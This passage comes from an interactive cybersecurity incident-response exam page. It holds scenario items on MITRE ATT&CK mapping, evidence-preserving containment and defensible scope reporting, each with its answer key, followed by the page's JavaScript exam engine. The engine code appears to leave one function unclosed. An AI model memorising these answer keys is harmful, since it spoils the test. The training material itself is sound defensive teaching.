window)"]}],"question":"Given ALL artefacts, which single mapping best describes the 02:14 execution moment?","hint":"One artefact is configuration, one is a duplicate plan that never fired — only one line is the run.","explanation":"\u003cb>T1569.002 is correct.\u003c/b> The run event lineages from services.exe (through cmd to PowerShell) show the \u003cb>service\u003c/b> executed the payload — T1569.002 (TA0002). \u003cb>The T1053.005 choice\u003c/b> is the trap: the task was registered but never ran — no task-scheduler run events exist, so the task is a spare plan, not the execution. \u003cb>The T1543.003 choice\u003c/b> is the persistence reading of the service — defensible for what the service was built for across reboots, but the 02:14 moment itself is a run. \u003cb>The T1059.001-only choice\u003c/b> names the interpreter while discarding the delivery vector, which the question asks about. Configuration events and run events tell different stories; only the run event answers ‘what executed’.","study":"Reading three artefacts together: config vs run, and which event is the execution moment.","data":{"options":[{"t":"T1569.002 (TA0002) — the service executed the payload at 02:14","correct":true,"why":"Correct — the run lineage comes from services.exe through the service binary."},{"t":"T1543.003 (Persistence) — the service creation is the answer","why":"Defensible as what the service was built for; the run moment itself is Execution."},{"t":"T1053.005 (TA0002) — the scheduled task ran it","why":"The task never fired: no task-scheduler run events exist."},{"t":"T1059.001 only — the interpreter is the whole story","why":"PowerShell ran, but the question asks for the execution vector."}]}},{"id":"X13","type":"order","summary":"Court-safe containment — order the five actions so evidence survives scrutiny","scenario":["Counsel signs off the containment plan for the DC incident — provided the evidence chain survives. Order the five actions so nothing is destroyed before it is captured."],"artefacts":[],"question":"Drag the five actions into the court-safe order.","hint":"Capture what dies first, disconnect, hand the business to the standby, export, then clean and watch.","explanation":"Order: (1) snapshot volatile state — processes, services, tasks — from EDR, because memory and runtime state die at any change; (2) isolate DC-02 from the network so nothing new executes or leaves; (3) fail authentication over to standby DC-01 — the business keeps logging in while the evidence host stays frozen; (4) export the event logs (4104/4698/7045) to the evidence share while the host is isolated but still running; (5) remove the service and task only after capture is confirmed, then monitor for re-execution, since a missed artefact shows up as recurrence. Every swap in this order either destroys evidence or extends attacker dwell.","study":"Court-safe sequencing: volatile capture → isolate → export → clean → restore.","data":{"items":[{"t":"Snapshot volatile state (processes, services, tasks) from EDR","why":"Volatile state dies first — capture it before anything changes."},{"t":"Isolate DC-02 from the network","why":"Stop new execution and exfiltration while evidence is fresh."},{"t":"Fail authentication over to standby DC-01","why":"The business keeps authenticating while DC-02 stays frozen for evidence."},{"t":"Export event logs (4104, 4698, 7045) to the evidence share","why":"Logs on a live host can be altered — take a copy while it runs isolated."},{"t":"Remove the service and task, then monitor for re-execution","why":"Cleanup only after capture is confirmed; recurrence exposes missed artefacts."}]}},{"id":"X14","type":"qcm-multi","summary":"Scope review — select every statement a senior would defend in writing","scenario":["The draft scope statement sits in the report. Facts: execution confirmed on FIN-01 at 22:41; sensor gap on six hosts 22:58–23:04; task HealthCheck registered on FIN-01 at 22:44; attribution chatter in chat mentions a famous group; nothing else confirmed."],"artefacts":[{"label":"ARTEFACT — Draft statements to audit","kind":"text","body":["Five statements are listed as options. Select the ones a senior analyst would put their name on."]}],"question":"Select EVERY statement a senior would defend in writing.","hint":"Defensible = precise about what is proven, open about what is not, silent about attribution theatre.","explanation":"Defensible: \u003cb>confirmed execution on FIN-01 at 22:41\u003c/b> (proven), \u003cb>additional hosts require verification\u003c/b> (honest about the gap), and \u003cb>the 4698 task registration is independent evidence of recurring execution planning\u003c/b> (a config artefact is real evidence of intent, stated as planning — not as a run). Not defensible: claiming nothing happened during the sensor gap (a gap proves nothing), and leaning on a base64 blob to name a famous group — encoded commands are used by dozens of actors and are not an attribution artefact. Written defensibility means every sentence survives the question ‘how do you know?’","study":"Written defensibility: proven facts, open gaps, no attribution leaps.","data":{"options":[{"t":"Confirmed execution on FIN-01 at 22:41","correct":true,"why":"Proven by correlated 4688 and 4104 artefacts."},{"t":"The encoded command’s base64 alone proves the famous group did it","why":"Encoded commands are commodity tradecraft — attribution needs more."},{"t":"Additional hosts require verification before a scope claim","correct":true,"why":"Honest about partial visibility — exactly what a senior signs."},{"t":"The 4698 task registration is independent evidence of recurring execution planning","correct":true,"why":"A registered task is real config evidence of planned recurrence — stated as planning."},{"t":"No execution occurred anywhere between 22:58 and 23:04","why":"A sensor gap shows nothing either way — this claim is unprovable."}]}},{"id":"X15","type":"flow","summary":"Final call — three decisions when the evidence must survive scrutiny","scenario":["23:40. DC-02 shows the WinDefUpd service executing encoded PowerShell. Legal demands the evidence survive scrutiny; operations warns that authentication latency is rising; the night watch has one re-execution attempt to handle. Three final calls chain."],"artefacts":[{"label":"ARTEFACT — Constraint card","kind":"text","body":["Legal: evidence chain must survive scrutiny. Ops: DC must return to service fast. Watch: WMI re-execution attempt observed from JUMP-01 at 23:52."]}],"question":"Take all three decisions in order.","hint":"Capture before any deletion; fail over before touching the DC; a second source of execution widens the case.","explanation":"Step 1: EDR volatile capture first, then network isolation, no deletions — the chain survives because nothing was destroyed before capture. Step 2: fail over to DC-01 first, keep DC-02 isolated — the business gets authentication back while the evidence host stays frozen; reconnecting or hard-shutdown both damage the case. Step 3: the WMI attempt from JUMP-01 is a second execution source — isolate the jump host too, escalate scope, keep the evidence chain; deleting WMI namespaces on DC-02 is evidence destruction, and ignoring it leaves a confirmed second vector live. Three calls, one principle: the evidence that survives scrutiny is the one you never touched first.","study":"Evidence-first incident decisions under legal and operational pressure.","data":{"steps":[{"text":["Decision 1 — Legal: evidence must survive scrutiny. The payload is still live on DC-02. First move?"],"artefacts":[],"options":[{"t":"Reboot the DC to clear memory","why":"Wipes volatile evidence and re-arms boot-start artefacts."},{"t":"EDR volatile capture, then network isolation — no deletions","correct":true,"why":"Capture first keeps the chain intact; isolation stops the live payload."},{"t":"Delete the service and task now","why":"Destroys the court exhibit before it is captured."}]},{"text":["Decision 2 — Ops: authentication latency is rising. Choose:"],"artefacts":[],"options":[{"t":"Reconnect DC-02 during failover","why":"Reconnects the compromised host to the production network."},{"t":"Hard-shutdown DC-02","why":"Kills volatile evidence and the ability to export logs."},{"t":"Fail over to DC-01 first; keep DC-02 isolated","correct":true,"why":"Business recovers on the standby; the evidence host stays frozen."}]},{"text":["Decision 3 — Night watch: one WMI re-execution attempt from JUMP-01. Final call:"],"artefacts":[],"options":[{"t":"Ignore until morning without logging","why":"A confirmed second vector left live and undocumented."},{"t":"Delete the WMI namespace on DC-02","why":"Evidence destruction on the primary exhibit host."},{"t":"Isolate JUMP-01 too; escalate scope; keep the evidence chain","correct":true,"why":"A second execution source widens the case — contain it and keep the chain."}]}]}}]}</script>
<script>
/* Cyber Pulse Academy exam engine — part A (core) */
(function () {
'use strict';

var META = JSON.parse(document.getElementById('cm-exercise-meta').textContent);
var DATA = JSON.parse(document.getElementById('exam-data').textContent);
var CFG = DATA.config;

/* ---------------- helpers ---------------- */
function $(s, r) { return (r || document).querySelector(s); }
function el(tag, cls, html) { var e = document.createElement(tag); if (cls) { e.className = cls; } if (html != null) { e.innerHTML = html; } return e; }
function esc(s) { return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }
function shuffle(a) { var x = a.slice(); for (var i = x.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = x[i]; x[i] = x[j]; x[j] = t; } return x; }
function pad(n) { return (n < 10 ? '0' : '') + n; }
function fmtClock(sec) { sec = Math.max(0, Math.floor(sec)); var h = Math.floor(sec / 3600), m = Math.floor((sec % 3600) / 60), s = sec % 60; return (h ? h + ':' + pad(m) : String(m)) + ':' + pad(s); }
function round1(n) { return Math.round(n * 10) / 10; }
function byId(id) { for (var i = 0; i < DATA.exercises.length; i++) { if (DATA.exercises[i].id === id) { return DATA.exercises[i]; } } return null; }
function badgeClass(sev) { return 'badge badge-' + (CFG.difficulty === 'extremely-hard' ? 'xhard' : CFG.difficulty); }

/* lightweight log/code highlighter (timestamps + Windows event IDs) */
function hl(text) {
  var t = esc(text);
  t = t.replace(/(\d{4}-\d{2}-\d{2}|\d{2}:\d{2}:\d{2})/g, '<span class="tk-time">$1</span>');
  t = t.replace(/\b(4688|4104|4698|7045|4103|4697|4699|4702|1102|4624)\b/g, '<span class="tk-eid">$1</span>');
  return t;
}
function artefactNode(a) {
  var wrap = el('div', 'artefact');
  wrap.appendChild(el('div', 'artefact-h', esc(a.label)));
  var body = el('div', 'artefact-b');
  if (a.kind === 'log' || a.kind === 'code') {
    if (a.kind === 'log' && a.filter) {
      var fl = el('div', 'logfilter');
      var inp = document.createElement('input');
      inp.type = 'text'; inp.placeholder = 'Filter lines…'; inp.setAttribute('aria-label', 'Filter log lines');
      var pre = el('pre', 'log');
      var render = function () {
        var q = inp.value.toLowerCase();
        var lines = a.lines.filter(function (ln) { return !q || String(ln).toLowerCase().indexOf(q) >= 0; });
        pre.innerHTML = lines.length ? lines.map(hl).join('\n') : '<span style="color:#7a87a0">No lines match this filter.</span>';
      };
      inp.addEventListener('input', render);
      fl.appendChild(inp);
      body.appendChild(fl);
      body.appendChild(pre);
      render();
    } else {
      var p = el('pre', a.kind === 'log' ? 'log' : 'code');
      p.innerHTML = (a.lines || []).map(hl).join('\n');
      body.appendChild(p);
    }
  } else if (a.kind === 'table') {
    var tb = el('div');
    tb.style.overflowX = 'auto';
    var tbl = el('table');
    tbl.style.borderCollapse = 'collapse'; tbl.style.width = '100%'; tbl.style.fontSize = '14px';
    (a.rows || []).forEach(function (row, ri) {
      var tr = document.createElement('tr');
      row.forEach(function (cellText) {
        var td = el(ri === 0 ? 'th' : 'td');
        td.style.cssText = 'border:1px solid #2a3550;padding:7px 10px;text-align:left;font-weight:' + (ri === 0 ? '800' : '400') + ';background:' + (ri % 2 ? '#121a2c' : 'transparent');
        td.innerHTML = hl(cellText);
        tr.appendChild(td);
      });
      tbl.appendChild(tr);
    });
    tb.appendChild(tbl);
    body.appendChild(tb);
  } else {
    (a.body instanceof Array ? a.body : [a.body || '']).forEach(function (para) { body.appendChild(el('p', null, para)); });
  }
  wrap.appendChild(body);
  return wrap;
}

/* ---------------- partial-credit scoring engine ---------------- */
function scoreExercise(H, W, N) { if (!N) { return 0; } return Math.max(0, (H - W) / N); }
function hintAdjusted(credit) { return Math.max(0, credit - 0.10); }

/* ---------------- exam state ---------------- */
var S = {
  phase: 'intro',            /* intro | exam | review | results */
  order: [], pos: 0,
  rec: {},                   /* id -> {credit, answered, hintUsed, skipped} */
  skipped: [],
  reviewingFrom: null,
  timer: 'RUNNING',          /* RUNNING | PAUSED_MANUAL | PAUSED_AUTO_CHECK | ENDED */
  manualBefore: null,
  remaining: CFG.seconds,
  pauseManualSec: 0, pauseAutoSec: 0, pauseSince: null,
  creditSum: 0, answered: 0,
  reported: false,
  user: null,
  flow: {},                  /* id -> {step, choices[], done} */
  exRemaining: null,         /* per-exercise countdown (seconds) for EXTREMELY HARD terminal */
  widget: null, checked: false, notice: null
};
var ticker = null;

function currentId() { return S.order[S.pos]; }

/* ---------------- timer state machine ---------------- */
/* States: RUNNING, PAUSED_MANUAL, PAUSED_AUTO_CHECK, ENDED (explicit, testable transitions) */
function setTimerState(st) {
  if (S.timer === st) { return; }
  if (S.pauseSince) {
    var d = Math.floor((Date.now() - S.pauseSince.at) / 1000);
    if (S.pauseSince.kind === 'manual') { S.pauseManualSec += d; } else { S.pauseAutoSec += d; }
    S.pauseSince = null;
  }
  if (st === 'PAUSED_MANUAL') { S.pauseSince = { kind: 'manual', at: Date.now() }; }
  if (st === 'PAUSED_AUTO_CHECK') { S.pauseSince = { kind: 'auto', at: Date.now() }; }
  S.timer = st;
  renderHeader();
}
function stateLabel(st) {
  if (st === 'RUNNING') { return '<span class="tstate tstate-run">▶ RUNNING</span>'; }
  if (st === 'PAUSED_MANUAL') { return '<span class="tstate tstate-man">⏸ PAUSED — manual (press Resume)</span>'; }
  if (st === 'PAUSED_AUTO_CHECK') { return '<span class="tstate tstate-auto">⏸ PAUSED — reviewing feedback (resumes on Next)</span>'; }
  return '<span class="tstate tstate-end">⏹ ENDED</span>';
}
function tick() {
  if ((S.phase !== 'exam' && S.phase !== 'review') || S.timer !== 'RUNNING') { return; }
  S.remaining -= 1;
  if (S.exRemaining != null) {
    S.exRemaining -= 1;
    var tb = $('#exTimebox');
    if (tb) { tb.textContent = '⏱ Exercise timer: ' + fmtClock(S.exRemaining); }
    if (S.exRemaining <= 0) { expireExercise(); return; }
  }
  if (S.remaining <= 0) {
    S.remaining = 0;
    setTimerState('ENDED');
    finishExam('The exam timer reached zero. Exercises you never answered were excluded from the score.');
    return;
  }
  renderHeader();
}
function startTicker() { if (!ticker) { ticker = setInterval(tick, 1000); } }

/* ---------------- header ---------------- */
function renderHeader() {
  var c = $('#hdrCounter');
  if (S.phase === 'exam') { c.textContent = 'Exercise ' + (S.pos + 1) + ' of ' + S.order.length; }
  else if (S.phase === 'review') { c.textContent = 'Review skipped exercises'; }
  else if (S.phase === 'results') { c.textContent = 'Final results'; }
  else { c.textContent = 'Introduction'; }
  $('#hdrTimer').textContent = '⏱ ' + fmtClock(S.remaining);
  $('#hdrTimerState').innerHTML = stateLabel(S.timer);
  var pct = S.answered > 0 ? Math.round((S.creditSum / S.answered) * 100) : 0;
  $('#hdrScore').textContent = 'Score ' + round1(S.creditSum) + ' / ' + S.answered + ' (' + pct + '%)';
  var hintBtn = $('#btnHint'), skipBtn = $('#btnSkip'), pauseBtn = $('#btnPause');
  hintBtn.disabled = (S.phase !== 'exam') || S.checked || (S.rec[currentId()] ? S.rec[currentId()].hintUsed : false);
  skipBtn.disabled = (S.phase !== 'exam') || S.checked;
  pauseBtn.textContent = (S.timer === 'PAUSED_MANUAL') ? '▶ Resume' : '⏸ Pause';
  pauseBtn.disabled = (S.phase !== 'exam');
}

/* ---------------- intro screen ---------------- */
function renderIntro() {
  S.phase = 'intro';
  $('#hdr').classList.add('hidden');
  var stage = $('#stage');
  stage.innerHTML = '';
  var sheet = el('div', 'sheet');
  sheet.appendChild(el('h1', null, esc(CFG.introTitle)));
  var chips = el('div', 'metachips');
  [['badge', CFG.severity], ['chip', DATA.exercises.length + ' exercises'], ['chip', 'Pass mark: 70%'],
   ['chip', 'Time limit: ' + CFG.minutes + ' minutes'], ['chip', 'MITRE ATT&CK ' + CFG.objectId]].forEach(function (m) {
    chips.appendChild(el(m[0] === 'badge' ? 'span' : 'span', m[0] === 'badge' ? badgeClass() : 'mchip', esc(m[1])));
  });
  sheet.appendChild(chips);

/* ---------------- widget: qcm (single + multi) ---------------- */
function buildQcm(ex, root, checkBtn, multi) {
  var letters = 'ABCDEFGHIJ';
  var view = shuffle(ex.data.options.map(function (o, i) { return { i: i, t: o.t, correct: !!o.correct, why: o.why }; }));
  var sel = {};
  var list = el('div', 'optlist');
  var btns = [];
  view.forEach(function (o, vi) {
    var b = el('button', 'opt');
    b.type = 'button';
    b.innerHTML = '<span class="opt-label">' + letters[vi] + '.</span><span class="opt-text">' + esc(o.t) + '</span>';
    b.addEventListener('click', function () {
      if (S.checked) { return; }
      if (multi) {
        sel[vi] = !sel[vi];
        b.classList.toggle('sel', !!sel[vi]);
      } else {
        sel = {};
        btns.forEach(function (x) { x.classList.remove('sel'); });
        sel[vi] = true;
        b.classList.add('sel');
      }
      var any = false;
      Object.keys(sel).forEach(function (k) { if (sel[k]) { any = true; } });
      checkBtn.disabled = !any;
    });
    btns.push(b);
    list.appendChild(b);
  });
  root.appendChild(list);
  function lab(o, vi) { return letters[vi] + '. ' + o.t; }
  return {
    grade: function () {
      var chosen = [];
      view.forEach(function (o, vi) { if (sel[vi]) { chosen.push({ o: o, vi: vi }); } });
      if (!multi) {
        if (chosen.length === 0) {
          return { H: 0, W: 0, N: 1, items: [{ state: 'missed', label: 'No option was selected', why: 'Nothing was chosen when Check was pressed.' }] };
        }
        var c = chosen[0];
        if (c.o.correct) { return { H: 1, W: 0, N: 1, items: [{ state: 'correct', label: lab(c.o, c.vi), why: c.o.why }] }; }
        var right = null, rightVi = 0;
        view.forEach(function (o, vi) { if (o.correct) { right = o; rightVi = vi; } });
        return { H: 0, W: 1, N: 1, items: [
          { state: 'wrong', label: lab(c.o, c.vi), why: c.o.why },
          { state: 'missed', label: lab(right, rightVi), why: right.why }
        ] };
      }
      var H = 0, W = 0, N = 0, items = [];
      view.forEach(function (o, vi) {
        var wasSel = !!sel[vi];
        if (o.correct) {
          N++;
          if (wasSel) { H++; items.push({ state: 'correct', label: lab(o, vi), why: o.why }); }
          else { items.push({ state: 'missed', label: lab(o, vi), why: o.why }); }
        } else if (wasSel) {
          W++; items.push({ state: 'wrong', label: lab(o, vi), why: o.why });
        }
      });
      return { H: H, W: W, N: N, items: items };
    }
  };
}

/* ---------------- widget: chip yard (match + categorize) ---------------- */
function buildPlace(ex, root, checkBtn) {
  var d = ex.data;
  var isMatch = ex.type === 'match';
  var items = shuffle(d.items.map(function (o, i) { return { i: i, t: o.t, target: o.target, why: o.why }; }));
  var assign = {};
  var picked = null;
  var chipEls = {}, zoneSlots = [], zoneEmpties = [];
  var bankChips = el('div', 'bank-chips');

  var zonesWrap = el('div', 'yard-zones');
  d.zones.forEach(function (z, zi) {
    var zone = el('div', isMatch ? 'yzone matchrow' : 'yzone');
    var title = el('p', 'yzone-title', esc(z.title));
    var slots = el('div', 'yzone-slots');
    var empty = el('span', null, isMatch ? 'Tap a chip, then tap here' : 'Drop matching chips here');
    empty.style.cssText = 'color:#7a87a0;font-size:13px;align-self:center';
    slots.appendChild(empty);
    zone.addEventListener('dragover', function (ev) { ev.preventDefault(); zone.classList.add('over'); });
    zone.addEventListener('dragleave', function () { zone.classList.remove('over'); });
    zone.addEventListener('drop', function (ev) {
      ev.preventDefault(); zone.classList.remove('over');
      var idx = ev.dataTransfer.getData('text/plain');
      if (idx !== '') { place(parseInt(idx, 10), zi); }
    });
    zone.addEventListener('click', function (ev) {
      if (ev.target !== zone && ev.target !== slots && ev.target !== title && ev.target !== empty) { return; }
      if (picked != null) { place(picked, zi); }
    });
    zone.tabIndex = 0;
    zone.setAttribute('role', 'button');
    zone.setAttribute('aria-label', 'Drop target: ' + z.title + '. Select a chip, then press Enter here to place it.');
    zone.addEventListener('keydown', function (ev) {
      if (ev.key === 'Enter' || ev.key === ' ') { ev.preventDefault(); if (picked != null) { place(picked, zi); } }
    });
    if (isMatch) {
      zone.appendChild(title); zone.appendChild(slots);
    } else {
      zone.appendChild(title); zone.appendChild(slots);
    }
    zoneSlots[zi] = slots; zoneEmpties[zi] = empty;
    zonesWrap.appendChild(zone);
  });

  items.forEach(function (it) {
    var chip = el('button', 'chip', esc(it.t));
    chip.type = 'button';
    chip.draggable = true;
    chip.addEventListener('dragstart', function (ev) { ev.dataTransfer.setData('text/plain', String(it.i)); });
    chip.addEventListener('click', function () {
      if (S.checked) { return; }
      if (assign[it.i] !== undefined) { assign[it.i] = undefined; picked = null; renderAll(); return; }
      picked = (picked === it.i) ? null : it.i;
      renderAll();
    });
    chipEls[it.i] = chip;
  });

  function place(itemIdx, zoneIdx) {
    if (S.checked) { return; }
    assign[itemIdx] = zoneIdx;
    picked = null;
    renderAll();
  }
  function renderAll() {
    d.zones.forEach(function (z, zi) { zoneSlots[zi].innerHTML = ''; zoneSlots[zi].appendChild(zoneEmpties[zi]); });
    bankChips.innerHTML = '';
    items.forEach(function (it) {
      var chip = chipEls[it.i];
      chip.classList.toggle('pick', picked === it.i);
      chip.setAttribute('aria-pressed', picked === it.i ? 'true' : 'false');
      if (assign[it.i] === undefined) { bankChips.appendChild(chip); }
      else { zoneSlots[assign[it.i]].appendChild(chip); }
    });
    d.zones.forEach(function (z, zi) {
      zoneEmpties[zi].style.display = (zoneSlots[zi].children.length > 1) ? 'none' : 'inline';
    });
    var count = 0;
    Object.keys(assign).forEach(function (k) { if (assign[k] !== undefined) { count++; } });
    checkBtn.disabled = (count === 0);
  }

  var bank = el('div', 'bank');
  bank.appendChild(el('p', 'bank-title', 'Chips — tap one, then tap a target'));
  bank.appendChild(bankChips);
  bank.addEventListener('dragover', function (ev) { ev.preventDefault(); });
  bank.addEventListener('drop', function (ev) {
    ev.preventDefault();
    var idx = ev.dataTransfer.getData('text/plain');
    if (idx !== '') { assign[parseInt(idx, 10)] = undefined; picked = null; renderAll(); }
  });
  var yard = el('div', 'yard');
  yard.appendChild(zonesWrap); yard.appendChild(bank);
  root.appendChild(yard);
  renderAll();

  return {
    grade: function () {
      var H = 0, W = 0, N = items.length, fb = [];
      items.forEach(function (it) {
        var a = assign[it.i];
        if (a === undefined) { fb.push({ state: 'missed', label: it.t, why: it.why }); }
        else if (a === it.target) { H++; fb.push({ state: 'correct', label: it.t + ' → ' + d.zones[a].title, why: it.why }); }
        else { W++; fb.push({ state: 'wrong', label: it.t + ' → ' + d.zones[a].title, why: it.why }); }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: ordering ---------------- */
function buildOrder(ex, root, checkBtn) {
  var correct = ex.data.items;
  var view = shuffle(correct.map(function (o, i) { return { i: i, t: o.t, why: o.why }; }));
  var list = el('div', 'ordlist');
  var rows = [];
  function rerender() {
    list.innerHTML = '';
    view.forEach(function (it, idx) {
      var row = rows[it.i];
      row._pos = idx;
      list.appendChild(row);
    });
  }
  view.forEach(function (it) {
    var row = el('div', 'ord-row');
    row.setAttribute('draggable', 'true');
    row.innerHTML = '<span class="ord-handle" aria-hidden="true">≡</span><span class="ord-text">' + esc(it.t) + '</span>';
    var up = el('button', 'ord-btn', '▲'); up.type = 'button'; up.setAttribute('aria-label', 'Move up');
    var down = el('button', 'ord-btn', '▼'); down.type = 'button'; down.setAttribute('aria-label', 'Move down');
    up.addEventListener('click', function () { if (S.checked) { return; } var p = row._pos; if (p > 0) { var t = view[p - 1]; view[p - 1] = view[p]; view[p] = t; rerender(); } });
    down.addEventListener('click', function () { if (S.checked) { return; } var p = row._pos; if (p < view.length - 1) { var t = view[p + 1]; view[p + 1] = view[p]; view[p] = t; rerender(); } });
    row.appendChild(up); row.appendChild(down);
    row.addEventListener('dragstart', function (ev) { ev.dataTransfer.setData('text/plain', String(row._pos)); row.classList.add('dragging'); });
    row.addEventListener('dragend', function () { row.classList.remove('dragging'); });
    row.addEventListener('dragover', function (ev) { ev.preventDefault(); });
    row.addEventListener('drop', function (ev) {
      ev.preventDefault();
      if (S.checked) { return; }
      var from = parseInt(ev.dataTransfer.getData('text/plain'), 10);
      var to = row._pos;
      if (!isNaN(from) && from !== to) {
        var moved = view.splice(from, 1)[0];
        view.splice(to, 0, moved);
        rerender();
      }
    });
    rows[it.i] = row;
  });
  rerender();
  root.appendChild(list);
  checkBtn.disabled = false;
  return {
    grade: function () {
      var H = 0, W = 0, N = view.length, fb = [];
      view.forEach(function (it, p) {
        var ok = (it.i === p);
        if (ok) { H++; } else { W++; }
        fb.push({
          state: ok ? 'correct' : 'wrong',
          label: 'Position ' + (p + 1) + ': ' + it.t,
          why: ok ? it.why : (it.why + ' (Correct position: ' + (it.i + 1) + '. In that slot the item was: ' + correct[p].t + '.)')
        });
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: fill in the blanks ---------------- */
function buildFill(ex, root, checkBtn) {
  var d = ex.data;
  var bank = shuffle(d.blanks.map(function (b) { return b.answer; }).concat(d.bank || []));
  var wrap = el('div', 'fillwrap');
  var sels = {};
  var parts = d.textWithBlanks.split(/\{(\d+)\}/g);
  function makeSelect(n) {
    var s = document.createElement('select');
    s.setAttribute('aria-label', 'Blank ' + n);
    s.appendChild(new Option('— choose —', ''));
    bank.forEach(function (o) { s.appendChild(new Option(o, o)); });
    s.addEventListener('change', function () {
      var any = false;
      Object.keys(sels).forEach(function (k) { if (sels[k].value) { any = true; } });
      checkBtn.disabled = !any;
    });
    return s;
  }
  for (var i = 0; i < parts.length; i++) {
    if (i % 2 === 0) { wrap.appendChild(document.createTextNode(parts[i])); }
    else {
      var n = parseInt(parts[i], 10);
      var s = makeSelect(n);
      sels[n] = s;
      wrap.appendChild(s);
    }
  }
  root.appendChild(wrap);
  return {
    grade: function () {
      var H = 0, W = 0, N = d.blanks.length, fb = [];
      d.blanks.forEach(function (b, bi) {
        var v = sels[bi + 1] ? sels[bi + 1].value : '';
        if (!v) { fb.push({ state: 'missed', label: 'Blank ' + (bi + 1) + ' → ' + b.answer, why: b.why }); }
        else if (v === b.answer) { H++; fb.push({ state: 'correct', label: 'Blank ' + (bi + 1) + ' → ' + b.answer, why: b.why }); }
        else { W++; fb.push({ state: 'wrong', label: 'Blank ' + (bi + 1) + ': you chose “' + v + '” → correct: ' + b.answer, why: b.why }); }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: ranking ---------------- */
function buildRank(ex, root, checkBtn) {
  /* shuffle display order so the stored rank order never leaks the answer */
  var items = shuffle(ex.data.items.map(function (o) { return { t: o.t, rank: o.rank, why: o.why }; }));
  var wrap = el('div');
  var sels = [];
  items.forEach(function (it, i) {
    var row = el('div', 'rankrow');
    row.appendChild(el('span', 'rank-text', esc(it.t)));
    var s = document.createElement('select');
    s.setAttribute('aria-label', 'Rank for: ' + it.t);
    s.appendChild(new Option('— rank —', ''));
    for (var r = 1; r <= items.length; r++) { s.appendChild(new Option(String(r), String(r))); }
    s.addEventListener('change', function () {
      var any = false;
      sels.forEach(function (x) { if (x.value) { any = true; } });
      checkBtn.disabled = !any;
    });
    sels.push(s);
    row.appendChild(s);
    wrap.appendChild(row);
  });
  root.appendChild(wrap);
  return {
    grade: function () {
      var H = 0, W = 0, N = items.length, fb = [];
      items.forEach(function (it, i) {
        var v = sels[i].value;
        if (!v) { fb.push({ state: 'missed', label: 'Rank ' + it.rank + ' → ' + it.t, why: it.why }); }
        else if (parseInt(v, 10) === it.rank) { H++; fb.push({ state: 'correct', label: 'Rank ' + it.rank + ' → ' + it.t, why: it.why }); }
        else { W++; fb.push({ state: 'wrong', label: 'You ranked ' + v + ': ' + it.t + ' → correct rank: ' + it.rank, why: it.why }); }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: terminal ---------------- */
function normCmd(s) { return String(s || '').trim().toLowerCase().replace(/\s+/g, ' '); }
function buildTerminal(ex, root, checkBtn) {
  var d = ex.data;
  root.appendChild(el('div', 'small', 'Type the command, press Run to see the lab answer, then press Check to grade it. Nothing real is executed.'));
  if (d.notice) { root.appendChild(el('div', 'timebox', esc(d.notice))); }
  var box = el('div', 'term');
  var scroll = el('pre', 'term-scroll');
  scroll.textContent = (d.banner || []).join('\n');
  var prow = el('div', 'term-prompt');
  var lab = el('label', null, esc(d.prompt));
  lab.setAttribute('for', 'termIn');
  var inp = document.createElement('input');
  inp.className = 'term-in'; inp.id = 'termIn'; inp.type = 'text';
  inp.autocomplete = 'off'; inp.spellcheck = false;
  inp.setAttribute('aria-label', 'Command line input');
  var run = el('button', 'term-run', 'Run');
  run.type = 'button';
  prow.appendChild(lab); prow.appendChild(inp); prow.appendChild(run);
  box.appendChild(scroll); box.appendChild(prow);
  root.appendChild(box);
  if (d.syntax) {
    var sp = el('div', 'synpanel');
    sp.appendChild(el('h4', null, 'Syntax reminder'));
    sp.appendChild(el('div', null, d.syntax.note));
    sp.appendChild(el('p', 'syn-ex', 'Example on a different target: <code>' + esc(d.syntax.example) + '</code>'));
    sp.appendChild(el('p', 'syn-ex', 'Expected output shape: <code>' + esc(d.syntax.sampleOut) + '</code>'));
    root.appendChild(sp);
  }
  function runCmd() {
    var v = inp.value;
    scroll.textContent += '\n' + d.prompt + ' ' + v + '\n';
    var n = normCmd(v);
    if (n && d.simMatch && new RegExp(d.simMatch).test(n)) {
      (d.sim || []).forEach(function (l) { scroll.textContent += l + '\n'; });
    } else if (n) {
      scroll.textContent += 'command not found: ' + v.trim().split(/\s+/)[0] + ' — this lab recognises only the command expected here.\n';
    }
    scroll.scrollTop = scroll.scrollHeight;
    if (n) { checkBtn.disabled = false; }
  }
  run.addEventListener('click', runCmd);
  inp.addEventListener('keydown', function (ev) { if (ev.key === 'Enter') { runCmd(); } });
  return {
    typed: function () { return normCmd(inp.value); },
    grade: function () {
      var n = normCmd(inp.value);
      var H = 0, W = 0, items = [];
      if (!n) {
        return { H: 0, W: 0, N: d.elements.length, items: [{ state: 'missed', label: 'No command was typed', why: 'The input was empty at Check time.' }] };
      }
      d.elements.forEach(function (eDef) {
        if (new RegExp(eDef.re).test(n)) { H++; items.push({ state: 'correct', label: eDef.label, why: eDef.why }); }
        else { items.push({ state: 'missed', label: eDef.label, why: eDef.why }); }
      });
      (d.danger || []).forEach(function (dg) {
        if (new RegExp(dg.re).test(n)) { W++; items.push({ state: 'wrong', label: dg.label, why: dg.why }); }
      });
      return { H: H, W: W, N: d.elements.length, items: items };
    }
  };
}

/* ---------------- widget: branching flow ---------------- */
function buildFlow(ex, root, checkBtn) {
  var steps = ex.data.steps;
  var letters = 'ABCDEF';
  var st = { step: 0, choices: [] };
  S.flow[ex.id] = st;
  var holder = el('div');
  root.appendChild(holder);
  function renderStep() {
    holder.innerHTML = '';
    if (st.step >= steps.length) {
      holder.appendChild(el('div', 'notice', 'All steps are taken. Press Check to grade the complete path you chose.'));
      checkBtn.disabled = false;
      return;
    }
    var s = steps[st.step];
    holder.appendChild(el('span', 'step-tag', 'STEP ' + (st.step + 1) + ' OF ' + steps.length));
    (s.text || []).forEach(function (t) { holder.appendChild(el('p', 'flow-text', t)); });
    (s.artefacts || []).forEach(function (a) { holder.appendChild(artefactNode(a)); });
    var list = el('div', 'optlist');
    shuffle(s.options).forEach(function (o, oi) {
      var b = el('button', 'opt');
      b.type = 'button';
      b.innerHTML = '<span class="opt-label">' + letters[oi] + '.</span><span class="opt-text">' + esc(o.t) + '</span>';
      b.addEventListener('click', function () {
        if (S.checked) { return; }
        st.choices[st.step] = o;
